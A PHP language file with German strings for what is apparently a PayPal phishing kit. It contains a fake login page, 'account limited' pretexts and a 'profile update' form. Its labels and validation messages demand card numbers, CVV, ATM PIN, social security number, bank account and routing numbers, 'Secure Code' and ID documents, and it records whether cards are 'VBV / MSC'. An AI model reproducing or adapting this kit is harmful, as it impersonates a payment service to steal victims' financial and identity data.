<?php  
$page="de_DE";

$confirmbutton = "bestätigen";
$confirmyourinfo = "Sie müssen die Informationen zu bestätigen, um dieses Problem zu und Zugriff auf Ihr Konto zu beheben";
$unabletoload = "Vorübergehend nicht auf Ihr Konto zu laden."; 

$copy1 = "Copyright © 1999-".$copyright." ";
$copy2 = "Alle Rechte vorbehalten.";
$wrong = "Einige von Ihnen eingegebenen Informationen ist nicht richtig.";
$titlerr = "Fehler : Anmeldung ";
$confirm = "Bestätigen Sie Ihre Konto Verwenden Sie es, wie Sie wollen";
$topp = "Ihre Sicherheit ist unser oberstes Gebot";
$secondarycred = "Sekundäre Kreditkarte (optional)";
$primarycred = "Primäre Kreditkarte";
$thiscardis = "Diese Karte ist VBV / MSC";



$section_n1 = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent_ = true;
$section_row_fluid_panel_blue_reverseLink = false;
$section_row_fluid_editorial_editorial_left_ = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n4_ = true;
$section_row_fluid_panel_light_center_text = true;
$top_title = "PayPal: ".ucfirst($_SESSION['country_name'])." bezahlen, Zahlungen empfangen & Geld senden";
$small_with_helper_input_0 = "Geben Sie eine gültige E-Mail-Adresse ein.";
$small_with_helper_input_1 = "Geben Sie ein Passwort ein.";
$login_email_input_0 = "E-Mail-Adresse";
$passwordRecovery1_a_0 = "E-Mail-Adresse vergessen?";
$login_password_input_0 = "Passwort";
$passwordRecovery2_a_0 = "Passwort vergessen?";
$login_button_a_0 = "Einloggen";
$signup_button_a_0 = "Neu anmelden";
$header_buy_a_0 = "Kaufen";
$header_sell_a_0 = "Verkaufen";
$header_send_a_0 = "Geschäftskunden";
$header_business_a_0 = "";
$signup_button_inner_a_0 = "Neu anmelden";
$hero_h1_0 = "Jetzt seid IHR dran";
$SignUp_consumer_hero_input_0 = "Weiter";
$signup_subline_p_0 = "Sie sind Unternehmer? Geschäftskonto eröffnen";
$icon_help_a_0 = "Hilfe";
$icon_contact_a_0 = "Kontakt";
$icon_search_button_0 = "Suchen";
$_large_h2_n1_0 = "Bequem bezahlen";
$_large_h2_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0 = "Wann und wo Sie wollen";
$_large_h2_row_fluid_editorial_editorial_left__0 = "Einfach PayPal anbieten";
$_large_h2_row_fluid_editorial_editorial_right_editorial_bg_n4__0 = "M-Commerce war nie einfacher";
$contentPara_p_n1_0 = "Sobald Sie ein PayPal-Konto haben, bezahlen Sie nur noch mit Ihrer E-Mail-Adresse und Ihrem Passwort. In jedem Shop, der PayPal anbietet – von A wie airberlin bis Z wie Zalando. ";
$contentPara_p_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0 = "Mit Paypal haben Sie Ihr Konto immer dabei, egal ob unterwegs oder zu Hause. Sie bezahlen immer bequem und bargeldlos - per Computer, Smartphone, Tablet oder SmartTV.";
$contentPara_p_row_fluid_editorial_editorial_left__0 = "Bieten Sie PayPal in Ihrem Shop an und schaffen Sie Vertrauen bei Ihren Kunden. So können Sie Ihre Reichweite und Ihren Umsatz steigern. ";
$contentPara_p_row_fluid_editorial_editorial_right_editorial_bg_n4__0 = "Ihre Kunden lieben es, mit ihren Smartphones und Tablets zu shoppen. Dabei erwarten sie eine einfache und reibungslose Kaufabwicklung. Mit uns sind Sie als Händler darauf vorbereitet. ";
$contentLink_a_n1_0 = "Bei eBay";
$contentLink_a_n1_1 = "In Online-Shops";
$contentLink_a_row_fluid_editorial_editorial_left__0 = "PayPal für Ihre Website";
$contentLink_a_row_fluid_editorial_editorial_left__1 = "Rechnung anbieten";
$contentLink_a_row_fluid_editorial_editorial_right_editorial_bg_n4__0 = "Mobil verkaufen";
$contentLink_a_row_fluid_editorial_editorial_right_editorial_bg_n4__1 = "Weitere Innovationen";
$contentLink_reverseLink_a_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0 = "Unterwegs bezahlen";
$contentLink_reverseLink_a_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__1 = "App herunterladen";
$closingHeadline_headline_large_p_0 = "Noch kein PayPal-Konto? ";
$btn_closing_cta_center_block_span4_a_0 = "Kostenlos anmelden";
$footer_footer_main_secondaryLink_li = array();
$footer_footer_main_secondaryLink_li[0] = "Hilfe";
$footer_footer_main_secondaryLink_li[1] = "Kontakt";
$footer_footer_main_secondaryLink_li[2] = "Gebühren";
$footer_footer_main_secondaryLink_li[3] = "Sicherheit";
$footer_footer_main_secondaryLink_li[4] = "Vorteile";
$footer_footer_main_secondaryLink_li[5] = "Apps";
$footer_footer_main_secondaryLink_li[6] = "Einkaufswelt";
$footer_footer_secondary_secondaryLink_li = array();
$footer_footer_secondary_secondaryLink_li[0] = "Über PayPal";
$footer_footer_secondary_secondaryLink_li[1] = "Blog";
$footer_footer_secondary_secondaryLink_li[2] = "Jobs";
$footer_footer_secondary_secondaryLink_li[3] = "Sitemap";
$footer_footer_secondary_secondaryLink_li[4] = "eBay";
$footer_footer_secondary_secondaryLink_li[5] = "Integration Center";
$footer_footer_secondary_secondaryLink_li[6] = "Presse";
$footer_footer_tertiary_secondaryLink_li = array();
$footer_footer_tertiary_secondaryLink_li[0] = "© 1999 - ".$copyright." PayPal. Alle Rechte vorbehalten.";
$footer_footer_tertiary_secondaryLink_li[1] = "Datenschutz";
$footer_footer_tertiary_secondaryLink_li[2] = "AGB";

$top_title2 = "Fehler - Login Deutschland - PayPal";
$alert_alert_warning_div_0 = "Sie müssen Ihre E-Mail-Adresse und Ihr Passwort eingeben. Versuchen Sie es bitte erneut.";
$loginheadline_p_0 = "Loggen Sie sich in Ihr Konto ein.";
$error_span_0 = "E-Mail-Adresse";
$error_span_1 = "Passwort";
$btn_large_input_0 = "Einloggen";
$pwrLinkoldflow_a_0 = "E-Mail-Adresse oder Passwort vergessen?";
$btn_btn_secondary_large_a_0 = "Jetzt kostenlos ein PayPal-Konto eröffnen";
$headline_p_0 = "Alles in einem.<SPAN class=headline-content>Kreditkarte oder Bankkonto? Sie haben die Wahl!</SPAN>";
$headline_p_1 = "Einfach. Und meistens kostenlos.<SPAN class=headline-content>Ein PayPal-Konto zu eröffnen, kostet nichts. Wir berechnen auch keine Transaktionsgebühr, wenn Sie etwas einkaufen. Ganz egal, welche Zahlungsquelle Sie wählen.</SPAN>";
$footer_li_footer_li = array();
$footer_li_footer_li[0] = "Über uns";
$footer_li_footer_li[1] = "Impressum";
$footer_li_footer_li[2] = "Gebühren";
$footer_li_footer_li[3] = "Datenschutz";
$footer_li_footer_li[4] = "Sicherheit";
$footer_li_footer_li[5] = "Kontakt";
$footer_li_footer_li[6] = "AGB";
$footer_li_footer_li[7] = "Jobs";
$legal_p_0 = "Copyright © 1999-".$copyright." PayPal. Alle Rechte vorbehalten.";

$charset = "UTF-8";
$profupdate = "Profil Aktualisieren - PayPal";
$processing = "Einloggen. ..";
$opay = "Anmelden - PayPal";
$ifno = "Wenn Sie diese Seite erscheint für mehr als 5 Sekunden";
$clickhere = "hier klicken";
$reload = "zu laden.";
$logout = "Abmelden";
$help = "Hilfe";
$s_center = "Sicherheit";
$myacc = "Mein Konto";
$over = "Übersicht";
$addfound = "Hinzufügen Fonds";
$retirar = "Auszahlen";
$banktf = "Übertragen Bank Rechnung";
$history = "Geschichte";
$bsearch = "Einfache Suche";
$dhistory = "Downloaden Geschichte";
$resolu = "Auflösung Zentrum";
$opencase = "Ansehen Offene Flle";
$guides = "Führungen";
$prof = "Profil";
$addemail = "hinzufügen oder bearbeiten Email";
$addbank = "Hinzufügen oder Bearbeiten Bank Rechnung";
$addcard = "Hinzufügen oder Bearbeiten Gutschrift Karte";
$addadr = "Hinzufügen oder Bearbeiten Postanschrift";
$sendmoney = "Geld senden";
$reqmoney = "Geld anfordern";
$mservices = "Merchant Dienstleistungen";
$autools = "Auktions-Werkzeuge";
$stra = "Sichern Transaktion";
$puf = "Profil aktualisieren";
$pip = "Persönliche Informationen Profil";
$acu = "Geben Sie Ihre Daten so genau wie möglich.";
$accu = "Stellen Sie sicher, geben Sie die Informationen genau und nach den Formaten erforderlich.";
$filla = "Sie alle erforderlichen Felder aus.";
$rfield = "Pflichtfeld";
$ffPrenom = "Vorname";
$ffNom = "Name";
$dateness = "Geburtsdatum";
$month = "Monat";
$day = "Tag";
$year = "Jahr";
$adr1 = "Adresszeile 1";
$adr2 = "Adresse Zeile 2";
$city = "Stadt";
$state = "Status";
$zip = "PLZ";
$country = "Land";
$scountry = "--W?hlen Sie Ihr Land--";
$hpn = "Startseite Telefonnummer";
$acpnum = "Diese Zahl wird verwendet, um Sie über Sicherheitsmanahmen und/oder anderen Fragen im Zusammenhang mit Ihrem PayPal-Konto zu kontaktieren.";
$ccprof = "Kredit/Debit Karte Profil";
$damelacc = "Geben-Informationen so genau wie möglich.";
$damelacb = "Für Kartennummer, geben Sie nur Zahlen bitte keine Bindestriche oder Leerzeichen.";
$Nomdutitulairedelacarte = "Kartenname";
$ccnumbr = "Kartennummer";
$expbr = "Verfallsdatum";
$cvv = "Karte Überprüfung Number";
$hcvv = "Hilfe finden Sie Ihren Card Überprüfung-Nummer";
$atmm = "Ihr ATM PIN";
$ssn = "Sozialen Sicherheit Nummer";
$routing = "BLZ";
$account = "Bank Kontonummer";
$hrouting = "Hilfe bei der Suche Ihrer Bankleitzahl";
$haccount = "Hilfe bei der Suche Ihrer Bank Rechnung Anzahl";
$codepersonel = "Sichere Code";
$IDTYPE = "Whlen Sie Art der Kennzeichnung";
$Passport = "Passport";
$Card_Identification = "Karte der Bezeichnung";
$Driving_License = "Führerschein";
$for1 = "Zu Ihrer Sicherheit überprüfen wir Kreditkarteninformationen.";
$for2 = "Der Prozess dauert in der Regel etwa 30 Sekunden, aber es kann lnger dauern, zu bestimmten Zeiten des Tages bitte klicken.";
$for3 = "Ihre Informationen zu aktualisieren.";
$spo = "Profil speichern";
$t1 = "Weitere Informationen";
$t2 = "Über uns";
$t3 = "Feedback";
$t4 = "Gebühren";
$t5 = "Datenschutz";
$t6 = "Sicherheits Zentrum";
$t7 = "Kontaktieren Sie uns";
$t8 = "Rechtliche Vereinbarungen";
$t9 = "Weltweit";
$t10 = "Arbeitsplätze";
$t11 = "Händler Dienstleistungen";
$t12 = "Unser Blog";
$t13 = "Labs";
$t14 = "Empfehlungen";
$t15 = "Site Map";
$t16 = "eBay";
$t17 = "Gemeinschaft";
$fdic = "Informationen über die FDIC Passieren-Durch-Versicherung";
$completeform = '<div id="messageBox" class="legacyErrors"> <div class="messageBox error"> <p style="width: 690px; margin-bottom: 6px; margin-top: 12px;"> Bitte füllen Sie das Formular unten, um Ihre Profil zu aktualisieren und wiederherstellen Zugriff auf Ihr Konto </p> </div> </div> ';

$valid = array("Bitte geben Sie Ihren Vornamen"
,"Ungültige Vorname" //--------
,"Bitte geben Sie Ihren Namen"
,"Ungültige Nachname" //--------
,"Bitte wählen Sie eine gültige Geburtsmonat." //--------4
,"Bitte wählen Sie eine gültige Geburtstag." //--------
,"Bitte wählen Sie eine gültige Geburtsjahr." //--------
,"Bitte geben Sie Ihre Adresse "
,"ungültige Adresse" //--------8
,"ungültige Adresse" //--------
,"Bitte geben Sie die Namen Ihrer Stadt"
,"Bitte geben Sie eine gültige Name der Stadt." //--------
,"Bitte geben Sie eine gültige Name der Stadt." //--------12
,"Wählen Sie Ihr Land"
,"Bitte geben Sie Ihre Postleitzahl"
,"Ungültige Postleitzahl." //--------15
,"Bitte geben Sie Ihre Telefonnummer"
,"Geben Sie nur die Anzahl"
,"Bitte geben Sie eine gültige Telefonnummer" //--------
,"Bitte geben Sie eine gültige Name des Karteninhabers" //--------19
,"Kartennummer in einem ungültigen Format"  ////--------
,"Kreditkartennummer ist ungültig"  //--------
,"Geben Sie nur die Anzahl"
,"Bitte wählen Sie den Ablaufdatum --Month-- "
,"Bitte wählen Sie den Ablaufdatum --Year-- "
,"Bitte geben Sie Ihre Cvv"
,"Bitte geben Sie eine gültige Cvv/CVV2- für Ihre Karte"//--------
,"Ungültige Cvv/CVV2" //--------29
,"Bitte geben Sie Ihre PIN-ATM "
,"Bitte geben Sie eine gültige ATM PIN" //--------
,"Bitte geben Sie eine gültige ATM PIN" //--------
,"Bitte geben Sie Ihre Sozialversicherungsnummer"
,"Ungültige Sozialversicherungsnummer"
,"Ungültige Sozialversicherungsnummer"
,"Die Sozialversicherungsnummer wird nur die Anzahl"
,"Bitte geben Sie Ihren Secure Code"
,"Ungültige Secure Code");

$allcountry1 = "Rund um die Welt";
$allcountry2 = "PayPal gibt es in 193 Märkten und 26 Währungen. So können Sie weltweit kaufen und verkaufen, ohne auf die gewohnte Sicherheit zu verzichten. ";
$One_moment = "Ein Moment...";

$your_money = "Holen Sie mehr aus Ihrem Geld";
$your_money_p = "Ihr PayPal-Konto gibt Ihnen ein sicherer, schneller und bequemer Weg, um online und auf Ihrem Mobil zahlen. Speichern Sie Ihre finanziellen Details sicher mit uns dann mit Ihrem Account zu kaufen, Geld überweisen oder verkaufen Sie Ihre Sachen, etwas mehr Geld zu machen - alles in nur wenigen Klicks.";
$websites = "Shop auf Millionen von Websites";
$websites_p = "PayPal ist in der ganzen Welt auf Millionen von Websites zur Verfügung. Also, ob Sie von der größten Verkäufer oder den kleinsten Spezialisten Kauf sind, können Sie, ohne Ihre Details und Geschwindigkeit durch Kasse einkaufen. Und je nachdem, was Gerät Sie verwenden, wird Ihr PayPal Erfahrung genauso schnell und bequem.";
$Simply_secure = "einfach sicher";
$Simply_secure_p = "Sicherheit steht im Mittelpunkt von allem, was wir tun. Ob es sich um den Schutz Ihrer finanziellen Details oder Ihre Einkäufe, setzen wir zuerst Ihre Sicherheit und Seelenfrieden. Das ist, warum verwenden wir führende Verschlüsselung und Anti-Fraud-Technologie, warum wir überwachen Transaktionen 24 Stunden am Tag und warum können wir Ihnen helfen Ihr Geld zurück, wenn der Kauf nicht ankommt oder nicht der Beschreibung entsprechen.";
$ex_date_info = "Bitte geben Sie uns Ihre Kartenablaufdatum (MM/JJJJ).";
$ex_date_empty = "Bitte geben Sie Ihre Kartenverfallsdatum .";
$ex_date_format = "Bitte geben Sie eine gültige Ablaufdatum (MM/JJJJ).";
$cardholder_info = "Verwenden Sie Ihren Namen wie auf der Karte";
$card_info = "Geben Sie Ihre Kartennummer";
$card_format = "Kartennummer ist ungültig";
$atm_info = "Geben Sie die atm Stift für diese Karte.";
$account_info = "Geben Sie Ihre Kontonummer";
$account_empty = "Bitte geben Sie Ihre Kontonummer auf Ihr Konto zu überprüfen";
$account_format = "Bitte geben Sie eine gültige Kontonummer";
$routing_info = "Geben Sie Ihre Bankleitzahl";
$routing_empty = "Bitte geben Sie Ihre Bankleitzahl, um Ihr Konto zu überprüfen";
$routing_format = "Bitte geben Sie eine gültige Bankleitzahl";
$first_name = "Ihr Vorname";
$first_name_info = "Verwenden Sie Ihre Rechts ersten Namen wie auf Ihren Führerschein, Sozialversicherungsausweis oder Reisepass gezeigt.";
$first_name_empty = "Wir brauchen Ihre Rechts Vorname auf Ihr Konto zu überprüfen.";
$last_name = "Ihr Nachname";
$last_name_info = "Verwenden Sie Ihre Rechts Nachnamen wie auf Ihren Führerschein, Sozialversicherungsausweis oder Reisepass gezeigt.";
$last_name_empty = "Wir brauchen Ihre Rechts Nachnamen, um Ihr Konto zu überprüfen.";
$Birth_date = "Geburtsdatum";
$Birth_date_empty ="Bitte geben Sie Ihr Geburtsdatum ein.";
$Birth_date_format = "Bitte geben Sie eine gültige Datum (TT/MM/JJJJ).";
$Birth_date_info = "Bitte geben Sie Ihr Geburtsdatum (TT/MM/JJJJ).";
$Address1 = "Adresszeile 1";
$Address1_empty = "Wir müssen eine gültige Adresse zu Ihrem Konto zu überprüfen.";
$Address1_info = "Wir können nicht akzeptieren, Postfächer oder Geschäftsadressen.";
$Address2 = "Adresszeile 2";
$City = "Stadt";
$City_empty = "Wir brauchen einen Ort/Stadt, um Ihr Konto zu überprüfen.";
$Postcode = "PLZ";
$Postcode_empty = "Wir brauchen eine Postleitzahl ein, um ein neues Konto für Sie erstellen.";
$Postcode_format = "Bitte überprüfen Sie Ihre Postleitzahl ein, für die Tippfehler, ist das Format nicht richtig aus.";
$fone = "Ihre Telefonnummer";
$fone_empty = "Wir benötigen Ihre Telefonnummer, um Ihr Konto zu überprüfen.";
$fone_format = "Bitte überprüfen Sie Ihre Telefonnummer für Tippfehler, ist das Format nicht richtig aus.";
$fone_info = "Ihre Telefonnummer (bitte nur Ziffern)";
$verifyaccount = "Überprüfen Sie, ob Sie Ihr Konto";
$Ownb = "Ein Geschäft besitzen?";
$hh1 = "Ihr sicheres Details";
$hh2 = "Ihre persönlichen Daten";
$pp1 = "Wir brauchen Ihre gültige sicheren Details, um Ihr Konto zu überprüfen.";
$pp2 = "Wir brauchen einige Informationen über Sie, bevor wir Ihr Konto zu überprüfen.";

$type1="Zuhause";
$type2="Handy";
$button_continue="Fortsetzen";
$button_validate="überprüfen";


?>